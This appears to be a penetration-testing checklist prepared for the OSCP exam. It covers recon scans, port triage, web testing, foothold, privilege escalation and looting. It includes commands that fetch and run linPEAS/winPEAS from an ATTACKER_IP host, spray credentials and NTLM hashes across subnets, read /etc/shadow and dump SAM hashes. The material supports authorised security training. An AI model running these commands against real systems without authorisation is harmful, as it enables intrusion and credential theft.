---
tags: [checklist, workflow, all-phases]
---

# Master Pentest Checklist

> Start here on every box. Work top to bottom. Check off as you go.
> When stuck: slow down, enumerate more, don't be clever.

> **OSCP METASPLOIT RULE:** You get Metasploit (multi/handler counts as free) on **ONE machine only**.
> Save it for the machine where you're most stuck OR for a reliable privesc you can't replicate manually.
> Never use it on your first foothold — you might need it more later.

---

## Phase 1 — Initial Recon

- [ ] Note IP, platform, OS hint (if given)
- [ ] Run full TCP scan → see [01_recon.md](./01_recon.md)
- [ ] Run UDP top-20 scan in background
- [ ] Run autorecon if time allows

```bash
# Step 1: RustScan — fast port discovery
rustscan -a $TARGET --ulimit 5000 -b 500 -- -Pn 2>/dev/null | tee recon/rustscan.out
PORTS=$(grep -oP '\d+(?=/tcp)' recon/rustscan.out | tr '\n' ',' | sed 's/,$//')

# Step 2: Nmap — deep scan on discovered ports
sudo nmap -Pn -sC -sV -p $PORTS -oN recon/tcp.out $TARGET

# Step 3: UDP in background
sudo nmap -Pn -sU --top-ports 20 -oN recon/udp.out $TARGET &
```

---

## Phase 2 — Service Triage

> **Before touching any service:** write two sentences — *What do I think this system is and what is it doing?* and *What would have to be misconfigured or wrong for it to be exploitable?* Form the hypothesis first, then enumerate to test it.

For each open port, check [03_service_enum.md](./03_service_enum.md).

### Common quick-wins by port

| Port      | Check First                         |
| --------- | ----------------------------------- |
| 21        | Anonymous FTP login                 |
| 22        | Banner grab, try found creds        |
| 25        | VRFY user enum, open relay          |
| 53        | Zone transfer                       |
| 80/443    | Tech stack, dirbusting, source code |
| 110/143   | Login with found creds              |
| 139/445   | Null session, share listing         |
| 161 udp   | SNMP community `public`             |
| 389/3268  | LDAP anonymous bind                 |
| 1433      | MSSQL default creds                 |
| 2049      | NFS exports, mount without auth     |
| 3306      | MySQL root no password              |
| 3389      | RDP — try found creds               |
| 5985/5986 | WinRM — try found creds             |
| 6379      | Redis unauthenticated               |
| 8080/8443 | Same as 80/443                      |

---

## Phase 3 — Web Application

If any HTTP/HTTPS port found → go to [02_web_enum.md](./02_web_enum.md).

- [ ] Identify tech stack (whatweb, Wappalyzer, headers)
- [ ] Bust directories and files
- [ ] Check robots.txt, sitemap.xml, /changelog, /.git
- [ ] Check SSL cert for hostnames → add to /etc/hosts
- [ ] Check page source for comments, credentials, paths
- [ ] Fuzz vhosts if redirected to hostname
- [ ] If CMS found → run cms-specific scanner
- [ ] Test every input field (SQLi, LFI, SSTI, command injection)
- [ ] Check for file upload → test extension bypass
- [ ] Test login pages: default creds, SQLi, hydra if lockout not suspected

---

## Phase 4 — Foothold

- [ ] Research any service version found in scan
  ```bash
  searchsploit "<service> <version>"
  # Also check exploit-db.com, github, packetstorm
  ```
- [ ] Check CVEs for exact version numbers
- [ ] Try default credentials on all login services
- [ ] Check for credential reuse across services
- [ ] **SPRAY every found credential against every service on every IP in scope immediately**
  ```bash
  # CME / nxc spray (nxc = netexec, new name for crackmapexec on Kali 2024+)
  nxc smb 192.168.x.0/24 -u found_user -p found_pass
  nxc smb 192.168.x.0/24 -u users.txt -p passwords.txt --continue-on-success
  nxc winrm 192.168.x.0/24 -u found_user -p found_pass
  nxc ssh 192.168.x.0/24 -u found_user -p found_pass
  ```
- [ ] If web: check for RCE via known CVE (check exploit-db, github PoC)
- [ ] Generate reverse shell → see [08_reverse_shells.md](./08_reverse_shells.md)

---

## Phase 5 — Internal Enumeration (post-foothold)

Run automated enumeration immediately after landing:

```bash
# Linux — always serve from your own HTTP server (no internet access in exam)
wget http://ATTACKER_IP/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/lp.out
curl http://ATTACKER_IP/linpeas.sh -o /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/lp.out

# Windows — serve from your HTTP server
certutil -urlcache -f http://ATTACKER_IP/winPEASany.exe C:\Windows\Temp\wp.exe
.\wp.exe | Tee-Object -FilePath C:\Windows\Temp\wp.out
# Or PowerShell:
iwr http://ATTACKER_IP/winPEASany.exe -o C:\Windows\Temp\wp.exe; .\C:\Windows\Temp\wp.exe | Tee-Object C:\Windows\Temp\wp.out
```

While automation runs, manually check:

**Linux:**

- [ ] `id && whoami && hostname`
- [ ] `sudo -l`
- [ ] `cat /etc/passwd | grep -v nologin`
- [ ] `cat /etc/crontab && ls /etc/cron.*`
- [ ] `find / -perm -4000 -type f 2>/dev/null` (SUID)
- [ ] `getcap -r / 2>/dev/null` (capabilities)
- [ ] `ss -anp` (listening services, internal ports)
- [ ] `cat ~/.bash_history`

**Windows:**

- [ ] `whoami /all`
- [ ] `net user && net localgroup administrators`
- [ ] `cmdkey /list`
- [ ] `(Get-PSReadlineOption).HistorySavePath` then read the file
- [ ] `ipconfig /all && netstat -ano`
- [ ] `schtasks /query /fo LIST /v`

---

## Phase 6 — Privilege Escalation

**Linux** → [04_linux_privesc.md](./04_linux_privesc.md)
**Windows** → [05_windows_privesc.md](./05_windows_privesc.md)
**Active Directory** → [06_active_directory.md](./06_active_directory.md)

> Domain-joined Windows machines: run [05_windows_privesc.md](./05_windows_privesc.md) AND [06_active_directory.md](./06_active_directory.md) in parallel — they feed each other.

---

## Phase 7 — Post-Exploit & Loot

- [ ] Grab proof flag (`local.txt`, `proof.txt`)
  ```bash
  # Linux
  find / -name "local.txt" -o -name "proof.txt" 2>/dev/null | xargs cat
  # Windows
  Get-ChildItem -Path C:\ -Include local.txt,proof.txt -Recurse -ErrorAction SilentlyContinue | Get-Content
  ```
- [ ] Screenshot `whoami && hostname && ipconfig/ifconfig && cat proof.txt`
- [ ] Dump credentials for reuse / pivot
  ```bash
  # Linux
  cat /etc/shadow
  # Windows
  reg save HKLM\SAM C:\Windows\Temp\sam && reg save HKLM\SYSTEM C:\Windows\Temp\sys
  # Then on attacker:
  impacket-secretsdump -sam sam -system sys LOCAL
  ```
- [ ] **SPRAY all newly dumped hashes/passwords across all other IPs in scope**
  ```bash
  nxc smb 192.168.x.0/24 -u Administrator -H <NTLM_HASH> --local-auth
  nxc smb 192.168.x.0/24 -u Administrator -H <NTLM_HASH>  # domain context
  ```
- [ ] Check for additional network segments
  ```bash
  # Linux
  ip route && arp -a
  # Windows
  route print && arp -a
  ```
- [ ] If pivot needed → [07_pivoting.md](./07_pivoting.md)

---

## Stuck? Checklist

- [ ] Did you scan ALL ports (not just top 1000)?
- [ ] Did you scan UDP?
- [ ] Did you add hostname to `/etc/hosts` and re-enumerate?
- [ ] Did you try every found credential against every service?
- [ ] Did you read the full source of every web page?
- [ ] Did you fuzz ALL parameters, not just obvious ones?
- [ ] Did you check version numbers against searchsploit AND github?
- [ ] Did you run linpeas/winpeas and read the full output?
- [ ] Did you check pspy for running processes (Linux)?
- [ ] Move on to another machine — come back fresh.
